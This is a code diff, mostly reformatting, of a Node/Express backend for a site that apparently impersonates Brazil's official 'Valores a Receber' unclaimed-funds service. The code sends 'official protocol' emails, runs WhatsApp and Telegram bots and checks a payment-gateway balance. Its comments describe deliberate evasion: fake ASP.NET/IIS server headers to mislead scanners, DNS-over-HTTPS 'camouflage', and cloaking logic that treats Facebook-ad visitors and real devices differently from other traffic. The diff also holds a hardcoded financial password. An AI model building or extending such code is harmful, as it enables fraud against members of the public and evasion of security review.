@@ -16,8 +16,8 @@ dotenv.config();
 let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://consultavaloresdisponiveis.com.br').replace(/\/$/, "");
 
 if (API_URL.includes("discloud.app")) {
-    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
-    API_URL = "https://consultavaloresdisponiveis.com.br";
+  console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
+  API_URL = "https://consultavaloresdisponiveis.com.br";
 }
 
 const app = express();
@@ -44,7 +44,7 @@ app.options("*", cors(corsOptions));
 app.use((req, res, next) => {
   const host = req.headers.host;
   const isWww = host && host.startsWith('www.');
-  
+
   // Detection for various environments (Heroku, ShardCloud, etc)
   const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';
 
@@ -67,7 +67,7 @@ app.use((req, res, next) => {
   res.header("Access-Control-Allow-Credentials", "true");
   res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
   res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, Origin");
-  
+
   // 🛡️ [CAMUFLAGEM] Advanced Security Headers
   res.header("X-Powered-By", "ASP.NET"); // Fake server info to mislead scanners
   res.header("Server", "Microsoft-IIS/10.0"); // Camouflage KingHost/Node.js
@@ -98,7 +98,7 @@ let currentConfig = {
   smtpPort: 465,
   smtpUser: "seu-email@dominio.com",
   smtpPass: "",
-  smtpSenderName: "Portal SVR - Protocolo Oficial",
+  smtpSenderName: "Portal de Valores - Protocolo Oficial",
   financialPassword: "ng197826", // Senha de segurança para financeiro
   adminPixKey: "",
   adminPixType: "CPF",
@@ -111,14 +111,14 @@ let currentConfig = {
 // Example of protecting sensitive data in memory/config
 const PROTECTED_FIELDS = ['smtpPass', 'financialPassword'];
 function protectConfig(config: any) {
-    const protectedConfig = { ...config };
-    PROTECTED_FIELDS.forEach(field => {
-        if (protectedConfig[field] && !protectedConfig[field].includes(':')) {
-            console.log(`🔒 [SEGURANÇA] Criptografando campo sensível: ${field}`);
-            protectedConfig[field] = encryptData(protectedConfig[field]);
-        }
-    });
-    return protectedConfig;
+  const protectedConfig = { ...config };
+  PROTECTED_FIELDS.forEach(field => {
+    if (protectedConfig[field] && !protectedConfig[field].includes(':')) {
+      console.log(`🔒 [SEGURANÇA] Criptografando campo sensível: ${field}`);
+      protectedConfig[field] = encryptData(protectedConfig[field]);
+    }
+  });
+  return protectedConfig;
 }
 
 // Apply protection to initial config
@@ -302,7 +302,7 @@ function killOrphanedChromium() {
 
 function startBot(id: string = 'main', delay: number = 0) {
   stopBot(id);
-  
+
   setTimeout(() => {
     console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id} (Atraso: ${delay}ms)`);
     const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
@@ -347,9 +347,9 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
       host: currentConfig.smtpHost,
       port: currentConfig.smtpPort,
       secure: currentConfig.smtpPort === 465,
-      auth: { 
-          user: currentConfig.smtpUser, 
-          pass: currentConfig.smtpPass.includes(':') ? decryptData(currentConfig.smtpPass) : currentConfig.smtpPass 
+      auth: {
+        user: currentConfig.smtpUser,
+        pass: currentConfig.smtpPass.includes(':') ? decryptData(currentConfig.smtpPass) : currentConfig.smtpPass
       }
 
     });
@@ -390,7 +390,7 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
         <!-- Header -->
         <tr>
             <td align="center" bgcolor="#1b668d" style="padding: 15px 0;">
-                <h1 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: bold; text-transform: uppercase;">Portal SVR — Sistema de Valores a Receber</h1>
+                <h1 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: bold; text-transform: uppercase;">Portal de Valores — Sistema de Valores a Receber</h1>
                 <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 11px; opacity: 0.9;">Comprovante de Homologação e Resgate de Ativos</p>
             </td>
         </tr>
@@ -519,11 +519,11 @@ async function getGatewayBalance() {
   try {
     const secret = process.env.SVR_CORE_S_AUTH;
     const auth = Buffer.from(`x:${secret}`).toString('base64');
-    
+
     // Using DoH to resolve the gateway domain for extra camouflage
     const ips = await queryDnsDoH("api.fastsoftbrasil.com");
     if (ips.length > 0) {
-        console.log(`🌐 [DNS-DoH] Resolvido api.fastsoftbrasil.com -> ${ips[0]}`);
+      console.log(`🌐 [DNS-DoH] Resolvido api.fastsoftbrasil.com -> ${ips[0]}`);
     }
 
     const res = await axios.get("https://api.fastsoftbrasil.com/api/user/wallet/balance", {
@@ -956,7 +956,7 @@ app.use((req, res, next) => {
   // Prioridade total para leads do Facebook e dispositivos humanos reais
   const isFacebookLead = fbclid || referer.includes('facebook.com') || referer.includes('fb.me');
   const isRealDevice = /iphone|ipad|android|windows nt|macintosh|linux/i.test(ua);
-  
+
   // 🛡️ [CLOAKING-LOGIC]
   // Se for uma rota de API ou arquivo estático (css, js, png, etc), deixa passar para não quebrar o site
   if (path.startsWith('/api') || path.includes('.') || path.includes('/assets/')) {
@@ -998,20 +998,20 @@ async function sendTelegram(text: string, messageId?: number, replyMarkup?: any)
 
     // Sem mudança de conteúdo ou mensagem não encontrada para editar
     if (errMessage.includes('message is not modified')) return messageId ?? null;
-    
+
     if (errMessage.includes('message to edit not found') || errMessage.includes('chat not found')) {
-        // Se a mensagem a ser editada não existe, tentamos enviar uma nova
-        return sendTelegram(text, undefined, replyMarkup);
+      // Se a mensagem a ser editada não existe, tentamos enviar uma nova
+      return sendTelegram(text, undefined, replyMarkup);
     }
 
     // Erro de HTML (entidade mal formatada)
     if (errMessage.includes('can\'t parse entities')) {
-        console.warn(`⚠️ [TELEGRAM] Erro de HTML detectado. Enviando como texto puro.`);
-        // Tenta enviar sem HTML
-        try {
-            const res = await axios.post(`${TELEGRAM_URL}/sendMessage`, { chat_id: CHAT_ID, text: text.replace(/<[^>]*>?/gm, ''), parse_mode: undefined });
-            return res.data.result?.message_id || null;
-        } catch (_) { return null; }
+      console.warn(`⚠️ [TELEGRAM] Erro de HTML detectado. Enviando como texto puro.`);
+      // Tenta enviar sem HTML
+      try {
+        const res = await axios.post(`${TELEGRAM_URL}/sendMessage`, { chat_id: CHAT_ID, text: text.replace(/<[^>]*>?/gm, ''), parse_mode: undefined });
+        return res.data.result?.message_id || null;
+      } catch (_) { return null; }
     }
 
     // Mensagem é uma foto (QR Code) — tenta editar a legenda (caption)
@@ -1925,45 +1925,45 @@ function getQueueInfo() {
 
 // --- INICIALIZAÇÃO CRÍTICA (CHROME) ---
 async function ensureChromeAndStart() {
-    console.log('🚀 [SISTEMA] Verificando disponibilidade do Chrome...');
-    
-    try {
-        const chromePathFile = path.join(process.cwd(), 'chrome-path.json');
-        let needsDownload = true;
+  console.log('🚀 [SISTEMA] Verificando disponibilidade do Chrome...');
 
-        if (fs.existsSync(chromePathFile)) {
-            const savedData = JSON.parse(fs.readFileSync(chromePathFile, 'utf8'));
-            if (savedData.path && fs.existsSync(savedData.path)) {
-                console.log(`✅ [SISTEMA] Chrome já configurado e válido em: ${savedData.path}`);
-                needsDownload = false;
-            } else {
-                console.log('⚠️ [SISTEMA] Caminho em chrome-path.json é inválido ou arquivo não existe.');
-            }
-        }
+  try {
+    const chromePathFile = path.join(process.cwd(), 'chrome-path.json');
+    let needsDownload = true;
 
-        if (needsDownload) {
-            console.log('📡 [SISTEMA] Chrome não encontrado ou inválido. Iniciando download...');
-            const { execSync } = await import('child_process');
-            
-            try {
-                execSync('node download-chrome.cjs', { stdio: 'inherit' });
-            } catch (e) {
-                console.error('⚠️ [SISTEMA] Falha ao rodar download-chrome.cjs. Tentando npx como fallback...');
-                try {
-                    execSync('npx @puppeteer/browsers install chrome@stable', { stdio: 'inherit' });
-                } catch (e2) {
-                    console.error('💀 [SISTEMA] Falha total ao instalar Chrome via scripts.');
-                }
-            }
-        }
-    } catch (e: any) {
-        console.error('⚠️ [SISTEMA] Erro crítico na fase de preparação do Chrome:', e.message);
+    if (fs.existsSync(chromePathFile)) {
+      const savedData = JSON.parse(fs.readFileSync(chromePathFile, 'utf8'));
+      if (savedData.path && fs.existsSync(savedData.path)) {
+        console.log(`✅ [SISTEMA] Chrome já configurado e válido em: ${savedData.path}`);
+        needsDownload = false;
+      } else {
+        console.log('⚠️ [SISTEMA] Caminho em chrome-path.json é inválido ou arquivo não existe.');
+      }
     }
 
-    // Início staggered (escalonado) para economizar recursos
-    setTimeout(() => startBot('main'), 2000);
-    startTelegramPolling();
-    app.listen(port, () => console.log(`🚀 Backend rodando na porta ${port}`));
+    if (needsDownload) {
+      console.log('📡 [SISTEMA] Chrome não encontrado ou inválido. Iniciando download...');
+      const { execSync } = await import('child_process');
+
+      try {
+        execSync('node download-chrome.cjs', { stdio: 'inherit' });
+      } catch (e) {
+        console.error('⚠️ [SISTEMA] Falha ao rodar download-chrome.cjs. Tentando npx como fallback...');
+        try {
+          execSync('npx @puppeteer/browsers install chrome@stable', { stdio: 'inherit' });
+        } catch (e2) {
+          console.error('💀 [SISTEMA] Falha total ao instalar Chrome via scripts.');
+        }
+      }
+    }
+  } catch (e: any) {
+    console.error('⚠️ [SISTEMA] Erro crítico na fase de preparação do Chrome:', e.message);
+  }
+
+  // Início staggered (escalonado) para economizar recursos
+  setTimeout(() => startBot('main'), 2000);
+  startTelegramPolling();
+  app.listen(port, () => console.log(`🚀 Backend rodando na porta ${port}`));
 }
 
 ensureChromeAndStart();
